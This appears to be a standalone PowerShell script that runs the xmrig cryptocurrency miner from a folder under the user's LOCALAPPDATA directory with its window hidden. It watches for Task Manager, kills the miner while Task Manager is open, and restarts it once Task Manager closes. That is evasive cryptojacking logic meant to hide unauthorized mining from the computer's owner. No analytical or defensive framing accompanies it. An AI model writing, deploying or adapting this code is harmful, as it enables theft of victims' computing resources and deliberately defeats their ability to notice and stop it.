$path = "$env:LOCALAPPDATA\CTF\xmrig.exe"
$ativoprocess = $false
$ativotask = $null

while ($true){
    Start-Sleep -Seconds 1
    try {
        Get-Process taskmgr -ErrorAction Stop
        $ativotask = $true
        try{Stop-Process -name xmrig -ErrorAction Stop}
        catch{}
        $ativoprocess = $false 
    }
    catch {
       $ativotask = $false 
       try{
            Get-Process xmrig -ErrorAction Stop
            $ativoprocess = $true
       }
       catch{
            if($ativoprocess -eq $false){
                Start-Process -FilePath $path -WindowStyle Hidden
                $ativoprocess = $true
            }
            else{
                $ativoprocess = $false
                Start-Sleep -Seconds 3
            }
       }
    }
}

